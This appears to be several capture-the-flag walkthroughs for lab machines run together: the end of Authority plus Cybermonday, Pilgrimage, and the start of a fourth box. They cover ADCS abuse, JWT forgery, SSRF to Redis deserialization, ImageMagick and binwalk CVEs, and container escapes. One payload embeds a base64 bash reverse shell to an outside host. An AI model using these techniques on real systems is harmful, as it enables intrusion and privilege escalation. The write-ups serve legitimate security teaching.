The password is “lDaP_1n_th3_cle4r!”, though it’s not trivial to see in that capture, as there are non-ASCII characters in this data that the terminal just drops. It’s easier to see in Wireshark:
Authority is acting as the client trying to authenticate to my VM, and sends these creds in the clear. Responder will also listen for and capture these creds:
Those creds work with the svc_ldap account over both SMB and WinRM:
I’ll go directly to WinRM and get a shell:
And the user flag:

Category: Shell as administrator
The filesystem is quite bare. There no other user directory on the box other than Public (which is empty) and Admistrator (which is where I want to get):
The IIS folders are empty, and I don’t see much of interest in the PWM configs.
It’s always worth enumerating ADCS on a Windows DC. I’ve shown certipy (pipx install certipy-ad, GitHub) before on Absolute and Escape. I’ll use the find command to identify templates, and with -vulnerable only show vulnerable ones:
At the bottom it identifies a template named CorpVPN that is vulnerable to ESC1. I’ll note the CA name of AUTHORITY-CA as well.
Black Hills Information Security has a nice post on ESC1. ESC1 is the vulnerability when the ADCS is configured to allow low privileged users to enroll and request a certificate on behalf of any domain object, including privileged ones.
The example given in the post shows the settings that must be for this to work, and it matches what comes out of Authority, except for one difference:
In this case, it’s Domain Computers who can enroll with this template, not Domain Users.
In Support I had an exploitation path that required a fake computer. I’ll do the same thing here, though on Support I did it from a shell on the target, while here I’ll show how to do it remotely with Impacket.
The setting that allows a user to add a computer to the domain is the ms-ds-machineaccountquota. On Authority, I can query this with PowerView:
netexec will also do this from my VM:
Now I can add the computer with addcomputer.py:
With the computer account on the domain, now certipy will create the certificate with the following options:
The result is a certificate plus private key saved in administrator_authority.pfx:
Typically at this point I would use the auth command to get the NTLM hash for the administrator user:
This happens “when a domain controller doesn’t have a certificate installed for smart cards”, according to this post from Specterops. Specifically, it happens because “the DC isn’t properly set up for PKINIT and authentication will fail”.
The same post suggests an alternative path:
If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like PassTheCert. You will only have LDAP access, but this should be enough if you have a certificate stating you’re a domain admin.
To perform a PassTheCert attack, I’ll need the key and certificate in separate files, which certipy can handle:
This repo has C# and Python tools to do a PassTheCert attack. It also offers an ldap-shell option that allows me to run a limited set of commands on the DC. I’ll clone it, and then run passthecert.py with the following options:
It connects:
I’ll play around with the various commands:
The one that works is add_user_to_group:
I’ll reconnect with a new Evil-WinRM shell as svc_ldap, and now it has the administrators group:
That’s enough to read root.txt:
The intended way to exploit this is to use the write_rbcd action to give the fake computer 0xdf$ delegration rights over the DC:
I’ll make sure my clock is in sync with Authority:
And get a Silver Ticket:
With this, I can dump the NTLM hashes from the DC:
That hash works over Evil-WinRM:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 19 Aug 2023
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.094s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Debian 11 bullseye.
The webserver is redirecting to cybermonday.htb. I’ll fuzz for subdomains using ffuf, but it doesn’t find anything. I’ll add cybermonday.htb to my /etc/hosts file and rescan port 80, but nothing new.
The site is for an online store:
There are two links on the page. One goes to the products page (/products):
Viewing individual products offers a Buy button, but it doesn’t do anything:
The login link presents a login form (/login):
There’s a link to register (/signup):
After logging in, there’s a “Home” link added to the menu bar (/home):
None of the things have links, except for “View profile” (/home/profile) which offers a chance to update my name, email, and password:
The HTTP response headers show that the server is nginx, and that the site is PHP:
The format of the two cookies being set looks very much like Laravel. I’ve shown this several times before.
The main page will load as index.php.
The 404 page is the default Laravel 404 page:
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
I’ll kill it after several minutes because it is just grindingly slow.
nginx has a common misconfiguration known as “off-by-slash”. I’ve run into this before in Pikaboo and Seal. It is common with nginx for a site to want to use an alias to change how certain files are accessed. This configuration is really common with static assets.
For example, something like this:
When someone visits /static/main.js, the webserver returns /var/www/site/static/main.js.
The issue comes if the configuration leaves off the trailing / in the top line:
The case of /static/main.js still works, returning /var/www/site/static//main.js. Because of how Linux handles double slashes in file system paths, this isn’t an issue. But, if I instead visit /static../flag.txt, then nginx rewrites that as /var/www/site/static/../flag.txt, allowing me to read out of the parent directory!
The feroxbuster above shows a /assets directory. To test for off-by-slash, I’ll try to visit /assets../. If the server is configured properly, that would miss the re-write entirely, and return a 404. But if it returns some other status code, that indicates the directory traversal worked.
It returns 403:
Laravel stores all it’s sensitive information in a .env file at the project root. I’ll download that successfully:
The information here is very subtle, but there is some:
I’ll use ffuf to brute force other files in that root directory:
The most interesting is the .git directory, as that will show most of the rest of the files.
I’ll use git-dumper to pull the .git repo from the webserver:
The result is the source for the site:
There’s only one commit in the repo:
app/routes/web.php defines the routes for the website:
Most of these I’ve seen before, but /dashboard is new. Trying to visit while logged in redirects to /home. However, trying to visit while logged out returns a Laravel debug crash:
“Attempt to read property “isAdmin” on null”.
The number of routes that take any input from the user is small. The home route has a route to update the user profile:
I’ll want to check that one out.
In app/resources/views/partials/header.blade.php, it defines the header, and there’s a check for auth()->user()->isAdmin when building the nav bar:
This is confirmation that the dashboard is intended for admins.
I’ll look at the views in app/resources/views/dashboard, but there isn’t much interesting.
The controllers are in app/Http/Controllers. From the route above, the update function of the ProfileController class in ProfileController.php is called when there’s a POST request to /home/update:
The code above for profile updates gets the current User object, and updates the data. However, there’s a mass assignment vulnerability here! It takes all the POST request fields except for _token, password, and password_confirmation, and then (after also updating the password with a bcrypt hash if necessary) updates the user object. This means if I submit a isAdmin field, it can be set.
To exploit this, I’ll send one of the POST requests to Burp Repeater and add isAdmin=1 to the end of the data:
The response is a simple 302 to /home/profile, but on refreshing the page, I’ll see “Dashboard” is added to the nav bar:
The dashboard has a bunch of graphs:
There’s nothing interesting on this page. The “Products” link (/dashbard/products) gives a form to add products:
It works, and I can add products:
I’ll try some XSS payloads, but nothing simple works:
The other link in the dashboard is to “Changelog” (/dashboard/changelog):
This seems to imply there is a SQL injection in the login page, but I don’t see it in the code and can’t get it to work on my own.
There’s also a link to a webhook url, http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77. That’s a new subdomain!

Category: Shell as www-data in Container
The link in the changelog returns an empty page. Looking at the request, it’s a 404:
Trying just /webhooks returns an unauthorized error:
The root returns JSON showing the full API. I’ll use jq to pretty print it:
If I try to interact with the API with POST data, it doesn’t work:
If I switch to JSON, it works:
It’s still failing, but at least it’s processing the input. This response also shows that the creds from the other site are not used here.
I’m able to register a user:
Now logging in returns a x-access-token:
Without the token (as shown above), /webhooks returns an unauthorized message. I’ll use the token, and it works:
If I try the /webhooks/create or other webhooks endpoints, it just returns unauthorized:
The HTTP response headers don’t give anything away as far as what technology the API is written in. It could be PHP, but it could be something else. I’ve seen it uses JSON for interaction.
The 404s are just blank bodies, which isn’t a clue.
The access token is a JWT. jwt.io shows the decoded information:
The body has a role that is currently user, as well as my username. The header shows that it’s using public key crypto to validate tokens. If a site is using asymmetric crypto to validate keys, typically that’s because other sites want to accept keys signed by this site. For that to work, public key must be available.
In this case, where there’s no path to the public key given in the key metadata, it is likely on the server is a well known name (like jwks.json or .wellknown/jwks.json).
feroxbuster didn’t seem to filter nicely on this API, so I’ll use ffuf. With my typical wordlist, it doesn’t find anything:
If I try another very popular wordlist, common.txt, it does find something interesting:
The .htaccess file doesn’t provide much:
jwks.json is a common file associated with JSON Web Key Sets (JWKS). This post from Okta goes into detail. Even without bruteforcing it would have been possible to find this just by guessing at some common file names.
The file has the RSA elements of the public key:
This post from PortSwigger has a nice background on an attack on JWTs called Algorithm Confusion. In their examples, a good webserver might look something like this:
It reads the JWT header, gets the algorithm, and verifies using the appropriate key. But a lazy implementation might look like:
It’s passing the public key and the token directly to verify. The site is assuming that the algorithm will always be RSA, but that is actually attacker controlled, and the verify function (likely imported) will handle all.
That means that if an attacker uses the public key like a symmetric key, it might be accepted.
The JWT itself says what kind of algorithm is in use. If the server is lazy enough to read the public key and then pass that along with the key to the verify function, it’s possible that it uses the public key as a symmetric key and validated.
To do this, I’ll need the public key in a string format, which is typically PEM. I’ll do this quickly in Python. I’ll start by importing the RSA library and urlsafe_b64decode (it’s important to get this one, as b64decode will not throw an error, but give wrong results):
I’ll grab the e value from jwks.json, which is URLsafe base64 encoded, and get that back to an int:
I’ll do the same with n:
It throws a padding error. I’ll just add = to the end until it works.
Now I’ll create an RSA object, and use it to get the exported key:
I’ll save that as secret:
Next I need to forge a JWT using this secret in HS256 mode. I’ll continue in the same Python shell, importing jwt:
I’ll take my valid cookie and get the data from it:
I’ll change the role to “admin”:
When I try to sign this, it fails:
There’s a check to prevent just this kind of mistake by a developer!
I could go into the library code and remove this check (in fact, I will in Beyond Root), but the sensible thing to do here is use a tool meant for pentesting, jwt_tool.
In general, the tool takes a JWT, as well as options. I’ll use the following:
When I run this, it gives a new JWT:
Armed with this forged token, I can retry to create a webhook:
This is progress! It’s no longer saying unauthorized, but rather picking at my inputs. Try again:
This time it doesn’t like the action, and nicely reports that it must be sendRequest or createLogFile.  This time it takes:
It’s there:
The API definition shows I can POST to /webhooks/:uuid:
I’ll try with an empty body:
It wants a log_name. That’s because the type of this one is createLogFile. I’ll try to write in my guess at the web root, but it fails:
If I just make the name “test”, it works:
I am not able to find this file or exploit it in any way.
I’ll create another hook, this time with action of sendRequest:
To trigger it, I’ll need a url and a method. I’ll start a Python webserver and request a file that doesn’t exist on my server:
The full 404 response comes back, and there’s a hit at my server:
If I want to interact with a non HTTP service, I can’t just use HTTP unless I figure out what to do with the headers. One idea is gopher, but it doesn’t work:
Another idea is to play with the method. Does it have to be valid? When I send {"url": "http://10.10.14.6/test", "method": "0xdf"}, the result at nc listening on my host is:
So there’s no method validation. Can I put in newlines? I’ll try {"url": "http://10.10.14.6/test", "method": "0xdf\r\nline 2\r\nline3"}, and it works:
This is perfect, as now I can send whatever I want at the top of the request.
The idea is that I’m going to use the SSRF to interact with Redis, and set the session data for my user to a payload to perform a deserialization attack. Then when I refresh the main site, the payload will be deserialized and I’ll get execution.
This step takes a ton of playing around with, and it’s mostly blind, though Ippsec and I were able to figure out some neat tricks to get some signal back. I can’t show all the failures it took to get to a working payload in a blog post, but it was many.
I also went down some rabbit holes trying to send data in the Redis serialization protocol (inspired by this gist), but later figured out I could just use the ASCII commands and it works too, so I’ll work with that.
My first though is to try run the simplest Redis command, ping (docs). It should just return “PONG”. I’ll try that in my SSRF payload, but it returns the “URL is not live” error:
Unfortunately, it just returns an error. That suggests that either I’m doing something wrong, or that the response isn’t what the Webhook is expecting and it crashes.
I can try other things like listing keys, but same result:
It still fails. Unfortunately, however the webhook code is set up, it can’t seem to get data back from Redis. This makes sense as the webhook is expecting an HTTP response back. Based on looking at the payloads if I send them to myself, they look right, so I’m going to proceed blind.
I’m also going to switch into Burp Repeater for sending requests. The payloads are about to get complex, and I’ll need to be able to use both single and double quotes, which from the bash command line is a huge pain. I’ll add -x localhost:8080 to the end of a curl command, and that sends it to Burp, where I can find it in my history and send that request to repeater.
I want to be able to write a key, so I can try something like this:
The challenge here is to know if that worked. To check, I’m going to stand up my own Redis server in a Docker container, making sure to forward port 6379 on my VM to that port on the container:
In a different window, I’ll get a session with that Redis instance:
To get a key from Cybermonday’s Redis, I’ll use the MIGRATE command. It’s important to be careful with this command. The docs say:
This command actually executes a DUMP+DEL in the source instance, and a RESTORE in the target instance.
It will delete the key from the current server and send it to the new one by default. If I add the COPY directive, it won’t delete, which is nice (though for the test key I just created and later for my own session information, deleting is ok as well). I’ll also add the REPLACE command. This tells Redis to overwrite the key in my instance if it’s already there.
The syntax I’ll use for MIGRATE is MIGRATE [host] [port] [key] [destination-db] [timeout] COPY REPLACE.
I’ll send the command:
In my local instance, the key is there with the data:
I can write keys into Redis!
Laravel stores the session data for a session in Redis under the key formatted as [prefix][sessionid]. I have the prefix laravel_session: from the .env file. I need to get the session ID from the cookie.
I’ll take a look at an existing Laravel session cookie, pulling the cybermonday_session cookie from my browser dev tools:
It’s a big URL-encoded base64-encoded blob. I’ll replace the %3D with = and decode it (using jq to pretty print):
It’s got an iv and a value. In Laravel, the session cookie is AES encrypted using the key. I happened to leak that key in the .env file above. I’ll decrypt it with CyberChef:
The input gets base64 decoded, and then decrypted using the key and iv:
The half after the pipe is the session id.
With the session id, plus the prefix from the .env file, I can try to poison the session data. I’ll start with a dummy string, using set laravel_session:cKMtZmoEsIHCsLQOH8XBuPYOnIwUIryDCRkSOAYZ 0xdf_was_here:
I’m doing both the set and the exfil of the result here. I can verify it worked by checking my Redis:
More importantly, when I refresh http://cybermonday.htb in the browser, it crashes!
It’s calling unserialize on the payload and crashing!
PHPGGC is the tool for creating deserialization payloads for PHP. This will use the gadgets available from various popular PHP frameworks to get execution. I’ll list and look at the Laravel ones:
I know from the debug crash that this is Laravel 9.46.0. There are none that specifically include this version, but many end with a “+”, suggesting they go higher. I’ll focus on 9-11 and 13-16. I also want gadgets that have all ASCII characters. The biggest risk is null bytes. For example, RCE9:
There may be a way to encode that, but I’d rather start with one with no nulls. I’ll write myself a quick bash loop to check each payload, and RCE10 jumps out as the winner:
I’ll grab that payload:
I’ll take the payload from above and drop it into Burp. I’ll need to wrap it in single quotes for Redis to handle it. When I first paste it in, Burp makes it clear that my double quotes are off with the coloring:
If I send this, it does fail:
The server can’t extract the url parameter because of the unescaped double quotes.
Once I escape the inner double quotes, it looks like this:
Sending this still fails, with the same \"url\" not defined message. As I am using the \ to escape double quotes, I also need to escape the slashes.
On sending this, it goes back to the “good” fail message, but the key isn’t changed in my Redis instance. The issue is that I need to wrap that long payload in single quotes to set it as a key.
On sending that, I see the updated payload in my Redis:
On refreshing the page, there’s the output of the command at the top right!
That is code execution!
I’ll create a simple bash reverse shell payload and base64 encode it:
Now the payload I give to phpggc doesn’t have to have quotes in it. I’ll make a payload:
I’ll update the request in Repeater. I actually only need to replace s:2:\"id\";} with s:88:"echo YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK|base64 -d|bash";}, or I can replace the entire thing (and re-escape as above):
The payload looks successful in Redis:
When I refresh the page, it hangs, but there’s a shell at nc:
I’ll upgrade my shell using the standard trick:

Category: Shell as john
This is very much a docker container. There are no users with home directories in /home. Only the root user has a shell set in /etc/passwd:
Neither ip nor ifconfig are installed, but /proc/net/fib_trie shows an IP of 172.18.0.7:
In the filesystem root, there’s a .dockerenv file:
Typically Docker gives the host the .1 IP, and then numbers of from there, so there could be a bunch  of containers here.
I noted above that the Changelog file was in /mnt. /mnt is /dev/sda1:
Looking at the files, it looks like a home directory:
There’s user.txt, though I can’t read it. There’s also a .ssh directory. It doesn’t have any private keys, but there is an authorized_keys file:
The public key ends with john@cybermonday. I’ll note that as likely the owner of this directory.
logs is also interesting, as it seems to have folders named after the name of the log webhooks:
ping isn’t installed on the container, so I’ll identify host by uploading a statically compiled nmap. When I try to run it, there are errors:
To fix this, I’ll upload a copy of /etc/services and save it as nmap-services in the same directory as nmap.
I’ll start by scanning ips 1-10, assuming that Docker will give out IPs sequentially:
It finds 7 hosts, including their hostnames:
The only container I haven’t seen yet or interacted with yet is the “registry” one. I’ll scan all ports to see what’s listening:
I’ll upload Chisel and make it executable:
I’ll start the server on my client (chisel_1.8.1_linux_amd64 server -p 8000 --reverse), and then connect from the container (./chisel client 10.10.14.6:8000 R:5000:172.18.0.5:5000). At the server the connection shows:
The root returns an empty response:
If this is a Docker Registry, then I should be able to list the repositories at /v2/_catalog (according to this post), and it works:
I’ll use docker pull to get a copy of the container on my system:
I’ll start the container in the background:
And get a shell in it:
The shell starts in /var/www/html, which has the API source code:
Otherwise, the image is completely empty. Nothing in /home, /root, /opt, /srv.  /var/backups is empty.
I’ll return to the source code in /var/www/html. So that I can use VSCode to look at it, I’ll copy it to my host:
The config.php file has information for connecting to the database:
The config values are stored in environment variables.
On opening it in VSCode, I’ll scan it with Snyk, and it reports 20 vulnerabilities. Most of them are crypto-related (weak hash SHA1, “Inadequate Padding”), but there are three that are Path Traversal:
The issue in WebhooksController.php is where log files are created. I played with this previously. Snyk is seeing this:
It thinks that the log_name being passed into webhook_createLogFile is unfiltered, which it is at this point. webhook_createLogFile is defined in app/functions/webhook_actions.php, and this is where the check that it only contains letters and numbers is:
So that’s a false positive.
The other two are in LogsController.php. It takes a request, first calling apiKeyAuth() and then getting the associated webhook:
I’ll come back to apiKeyAuth later.
If it doesn’t exist or is the wrong type, it returns an error:
Next it validates that the action value is correct, not empty, and that if the action is “read”, that the log_name is set:
$logPath is set based on what is stored in the webhook, and then it switches based on the action:
If the action is “list”, it returns the contents of this directory:
If the action is “read”, it removes ../ and spaces from the log_name, and returns the log if it exists and “log” is in the $logName:
At the top of LogsController there’s a call to $this->apiKeyAuth(). This function is defined in app/helpers/Api.php:
It checks that the x-api-key header in the request is set to a hard-coded value, “22892e36-1770-11ee-be56-0242ac120002”.
Snyk identifies this as a case where “Unsanitized input flows into file_get_contents”, but there is some sanitization that it misses. Unfortunately, the developer made an error. First the code removes the ../, and then it replaces spaces with nothing. That means if the $logName contains something like .. / (with a space between the second dot and the slash), it will make it through.
This error allows me to read any file I want. There is potentially a way to list other directories. I could go look at how the webhook creates paths to see, but I’ll see if I can get what I need from just reading known files.
When I request / on the API it returns a list of routes, and it’s not clear based on that list what would lead to the code in LogController.php:
It’s tempting to think that this list is generated based on the available endpoints, but there are a couple hints it’s not. For one, / isn’t included, and it definitely exists and returns something. Additionally, there’s a typo in /webhooks/delete, where it’s missing a / before the :uuid:
Looking at app/routes/Router.php, it defines the actual routes:
In addition to the ones above, it shows / and /webhooks/:uuid/logs. The latter triggers the LogsController.
I’ll create a new webhook to get a fresh start:
I’ll write a log file:
If I try to list the files, I get an unauthorized error:
This is the additional API key auth. I’ll add that header:
I can read that log:
I’ll now try to read /etc/passwd. The logs are stored in /logs/{webhook name}/, so I should need to go up two directories and then into /etc:
This is because of the check looking for the string “log” in the path. I’ll go into the logs directory and then back out again to satisfy this check:
That’s the /etc/passwd file!
My first thought was to read the .env file for this server, just like on the app, to get the database creds loaded in config.php. Unfortunately, it doesn’t exist:
It’s possible that they are loaded by Docker from the host. I’ll dump the environment from the /proc structure:
That works, but it’s ugly. jq and some more bash foo to fix that:
DBPASS=ngFfX2L71Nu
With a username john identified in the SSH authorized_keys file above, and a password, I’ll try SSH, and it works:
Finally I can read user.txt:

Category: Shell as root
john’s home directory is nothing different from what was mounted into the API container.
The only other thing that jumps out on the file system is a Python script in /opt:
john can also run this as root using sudo:
The python script defines a bunch of functions, and then at the bottom runs with the standard dunder-name check:
It checks that exactly one arg is provided, showing usage otherwise. Then it calls name on the given argument, which does a bunch of validation on the argument, returning True or False. If it returns True, then it create a temp directory, copies the input file into that directory named docker-compose.yml, goes into that directory, configures a signal handler, then calls subprocess.run to run docker-compose up --build. After starting the containers, it calls cleanup, which calls docker-compose down --volumes and then removes the temp directory. Effectively, this should let me start a multi-container Docker application from a yml file, and then kill it.
The signal handler just calls the cleanup function and exits when Ctrl + c is entered:
It simply calls cleanup on the temp directory and exits.
What remains is to understand what main does to determine if the compose file is valid. Without this, I could easily start a container with the filesystem root mounted into it and then enter as root.
main is a series of checks, each of which just returns False if failed. First main checks that the file exists:
Then it sale_loads the yaml, and validates that it has a services key as all compose files must have according to the specs:
Then it calls check_no_privileged on the service:
This function does what it says, checking for the “privileged” flag in the items:
Finally, it checks the volumes defined in the compose:
check_read_only makes sure that each volume definition string ends in :ro making it read only. Volume definitions typically look like host_path:container_path:permissions, thought they can also be just host_path:container_path with the default rw permissions. This means that all volumes must be mounted as read only.
check_whitelist requires that the volume has three items separated by : (which it must to pass the check_whitelist check) and that the host path is on an allowed list:
It can only mount /mnt (which is empty) or the current user’s home directory, getting the user who called sudo, even if it’s running as root.
I originally solved this by creating a container with john’s home directory, and creating a SetUID bash instance in it owned by root. This is apparently unintended, and the box author made some attempts to make this not work.
I’ll create a simple docker-compose.yml file:
This will create a container using the only image I know exists on Cybermonday. It’ll run a bash reverse shell to keep the start hanging while I interact with it. It will also mount john’s home directory into /john.
I’ll start nc in a different terminal and run the script:
At nc there’s a shell in the container:
john’s home directory is there:
I can’t write to it because it’s read only:
The plan is to re-mount the share. It’s currently mounted from /dev/sda1:
I’ll try to remount it, but I don’t have permissions:
I’ll try adding capabilities to the container to give it more permissions:
I’ll start it again, and try the remount inside the container:
This is progress. It’s still an error, but no longer a permissions issue.
In searching for these error messages, I’ll come across a bunch of different Docker related threads with failing mounts where the answer has to do with AppArmor:
In all these issues, there is mention of AppArmor and disabling it with --security-opt apparmor:unconfined. This can be put in the docker-compose file:
When I start this one, the mount works!
And the file I write shows up on the host owned by root:
I’ll copy the host’s bash into /home/john:
As I want this to run on the host, it’s important to use the bash binary from the host, as the one in the container won’t run on it.
This file is owned by UID 1000:
I’ll update the owner and set it as SetUID/SetGID:
It works:
Running it with -p gives a shell with effective ID of root:
Which is enough to read root.txt:
If I wanted to have uid and gid as root, I could use Python:
The intended path to solve this step was to abuse capabilities to allow the container to read files from the host. This 2014 blog post shows how CAP_DAC_READ_SEARCH can be abused from within a container with the open_by_handle_at syscall. This call allows me access to handles from other processes. The security here is that I can only open these handles if I have access to them. But with CAP_DAC_READ_SEARCH, these permissions are ignored. I exploited this before in Talkative.
For this strategy, I only need to add the capability:
I’ll start the container and get a shell in it.
There’s a POC exploit linked from the blog post above. I’ll upload it to the container and then compile it:
When I run this, it fails:
That’s an error at this line in the code:
.dockerinit is an old file, which makes sense since this exploit was written in 2014. I’ll just use /etc/hosts. After changing that filename, I’ll upload the code, compile it again, and run:
The output is long, but it ends with /etc/shadow!
I don’t just want to read /etc/passwd. I’ll update the main function to take args:
I’ll also update the file being read:
For completeness, I’ll update the success print:
I’ll upload, compile, and run, this time with an arg (as I did not checks, it just crashes with no arg):
There’s the root flag!
It would be disappointing for a HackTheBox machine to grant only file read and not a root shell. Typically, HTB would at least leave a root SSH key or make the root password crackable, but that’s not the case here.
The intended way to get execution is to do the same escalation I showed in Monitors, but using capabilities in the container to load a kernel module.
I won’t show it here, as it’s the same as monitors. The only extra trick (which is by no means trivial) is getting the kernel image and headers along with things like insmod and the packages it requires installed in the container so that the exploit can be compiled and loaded.
The Python JWT library has safe guards in place to prevent developers from making mistakes that would lead to algorithm confusion vulnerabilities. I ran into those above and switched to a tool designed for offensive JWT generation and manipulation, jwt_tool .
Still, it’s a good exercise to understand how these protections are in place, and if I can modify the library to let me past the guard rail. That’s what I’ll do in this video:
Given the off-by-slash vulnerability at the start of the box, I wanted to check the nginx config now that I have root access.
There are six docker containers, matching what I identified with nmap:
I’ll get a shell in the nginx container:
There is no sites-available / sites-enabled folders as I’m used to seeing:
The webservers are defined in conf.d/default.conf. The first is for the api:
If the server_name matches, then it proxies it over to http://api.
Next is the default server:
For any server name that doesn’t match another, it returns a 301 redirect to http://cybermonday.htb.
The final server is for cybermonday.htb:
For a request to /, it tries to find a file at the URI, URI plus slash, and at index.php. For anything ending in .php, it passes it to the app on port 9000.
The vulnerability is in the location /assets. That should have a trailing /. Without it, I can do what I did above.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 24 Jun 2023
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.092s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap finds two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH version, the host is likely running Debian 11 bullseye.
Port 80 shows a redirect to pilgrimage.htb. I’ll fuzz for subdomains with ffuf, not find anything, and add this to my /etc/hosts file:
One thing I typically don’t show but always do (or at least try to remember to do) is re-scan the host by domain name with nmap. In this case, there are additional results:
There’s a Git repo on the website. nmap didn’t find that before because the HTTP request to http://10.10.11.217 just gets a 301 redirect, no matter the path. But when it’s scanning http://pilgrimage.htb, it finds the repo with the http-git script. I could also find this later with feroxbuster, but the wordlist I typically use doesn’t include .git.
The website is an image size reduction tool:
If I give it an image and click “Shrink”, it return a URL to the smaller image:
The URl does lead to a smaller version of the uploaded image. Trying to visit /shrunk returns a 403 forbidden.
If I create an account and login, there’s a dashboard (at /dashboard.php) that shows a currently empty table of original files and shrunken urls:
I’ll play with uploading the same picture with different names and the same name:
The new image name seems to change for each upload, even if the image or image name are the same. It also always starts with 655c, which implies that it’s not a hash that’s making the name.
The HTTP response headers don’t give much additional information beyond that it’s nginx as identified by nmap:
The site is clearly PHP based on the extensions of the pages.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
/tmp is interesting, but visiting just gets a 403 forbidden.

Category: Shell as emily
git-dumper is a nice tool for pulling Git repos from websites. It installs with pipx install git-dumper. I’ll create a directory for the results to go to, and then run it against Pilgrimage:
It downloads the .git folder, which contains all the metadata about the repo and the files in it, including what all the files content was at the last commit. The last line runs git checkout . in the directory, which effectively resets the directory back to the last commit, creating all those files.
The POST requests with images go to index.php. It takes the POST and creates a file object, saving it in /tmp:
Then it takes the result and greats a new file name from uniqid (which is just a unique ID based on time in PHP):
Then it runs magick to convert it by shrinking it by 50% and deletes the original file:
If the user is logged in it saves the new path and original path to the DB:
There’s a copy of magick in the repo, and it is an executable:
It will also run:
Searching for this version finds a bunch of references for CVE-2022-44268:
The issue is in how the text string “profile” is handled by ImageMagick. This post from metabaseq does a really nice job with details, and offers this high level description:
A malicious actor could craft a PNG or use an existing one and add a textual chunk type (e.g., tEXt). These types have a keyword and a text string. If the keyword is the string “profile” (without quotes) then ImageMagick will interpret the text string as a filename and will load the content as a raw profile. If the specified filename is “-“ (a single dash) ImageMagick will try to read the content from standard input potentially leaving the process waiting forever.
In ImageMagick, a profile refers to a set of color management settings that define how colors are represented and handled in an image. Color management is important because different devices (such as cameras, monitors, and printers) may interpret and reproduce colors differently. Profiles help ensure consistent and accurate color representation across various devices.
There are many POC scripts out there, but I prefer to do it manually This Github page has steps for doing so. I’ll start with a generic PNG, and use pngcrush to add the profile string:
This creates a new file, pngout.png, which has the metadata in the tEXt section:
exiftool will show it as well:
I’ll submit this to the site, and download the resulting file:
identify -verbose will show the resulting metadata, where the file is in the profile section:
That hex is the file that was read, and can be decoded many ways:
This repo has a nice Python version of the exploit. I run it once to create a malicious image, and then again pointing at the image on the site to get the results:
I’ll start by checking the users on the box in the /etc/passwd file:
I’ll try to grab SSH keys for emily, but fail. There’s no other user where it seems reasonable that they might have a .ssh directory based on their home directories.
The source code shows that the site is running off a SQLite database. For example, in login.php:
I’ll try to grab that file:
That makes sense, as it’s binary data and the script seems to be expecting only ASCII text.
I could manually get the data out of the file. I’ll download the file from the site, and with a little playing around with grep, I can isolate just the lines with the hex data, and then use xxd to convert it back to binary:
I’ll open the database with sqlite3:
There are two tables:
The images table doesn’t look interesting, but the users table does:
There’s only a single user (mine must have been cleaned out):
emily is a user on Pilgrimage (from the /etc/passwd file). This password works to connect over SSH:
And read user.txt:

Category: Shell as root
emily cannot run sudo on Pilgrimage:
I’ll look for SetUID / SetGID binaries owned by other users, but not find anything interesting.
The running processes show a few interesting things:
root is running /usr/sbin/malwarescan.sh. There’s also a inotifywait process running that’s watching for files to be created in the /var/www/pilgrimage.htb/shrunk directory. inotifywait is a way to trigger a process whenever some event happens on the filesystem.
The script is a Bash script and is responsible for the inotifywait command:
It’s watching for file creations in the shrunk directory, and using binwalk to look for any executables in the files.
To understand how the script works, I’ll get two SSH sessions. In the first, I’ll run inotifywait to watch for events in /dev/shm with inotifywait -m -e create /dev/shm. Then in another, I’ll write a file:
In the first one, a line comes out:
So the script is using sed to remove the stuff up to “CREATE “, leaving just the filename.
The next part of the script runs binwalk on the file. I’ll upload an image and try it to see what the results look like:
On my own computer, I can try it on a Windows exe:
This would trigger the scanner, as it contains the string “Microsoft executable”.
My first thought was that this script must be vulnerable to command injection. If I control the filename, then I should be able to inject either on the filename= line or in the binout= line.
It seems like having a filename with $() or a command between ; ; should work, but it doesn’t. It turns out that Bash is actually good at preventing command injection.
It reminds me a lot of when I was making ScriptKiddie, specifically the step to pivot from kid to pwn. I was trying to make the script vulnerable to command injection, but Bash didn’t allow it. I eventually left this script (which also ran triggered by inotifywait, interestingly):
The reason the nmap scan runs under sh -c is so that it would be vulnerable to this injection.
The -h option in binwalk will show the version:
This is version v2.3.2.
Searching for “binwalk CVE” returns a bunch of references to CVE-2022-4510:
This version should be vulnerable.
This post from OneKey describes who their researcher found this issue. binwalk is actually a Python script, and it uses os.path.join to build paths. The issue is that if there are ../ in one of the items being joined, it doesn’t resolve those.
Files in a PFS filesystem can have ../ in their filename.
So while the code does an os.path.join and then checks to make sure that the resulting path starts with the intended directory, because the ../ doesn’t get resolved, that check will never fire and therefore is bypassed.
This gives arbitrary write as the binwalk process. This can be exploited by overwriting an authorized_keys file or crontab file. The author in the post shows how to write a binwalk plugin that will actually get picked up and executed during the scan that generates it.
This repo has a working Python exploit that abuses the plugin creation method. I’ll try the ssh method, giving it a template file and a public key:
The output is a file named binwalk_exploit.png. I’ll upload it into the shrunk directory:
From there, I’m able to SSH in as root:
And get the root flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 17 Jun 2023
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.091s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  httpsCategory: Recon
nmap finds three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):
Based on the OpenSSH version, the host is likely running Ubuntu 22.04 jammy.
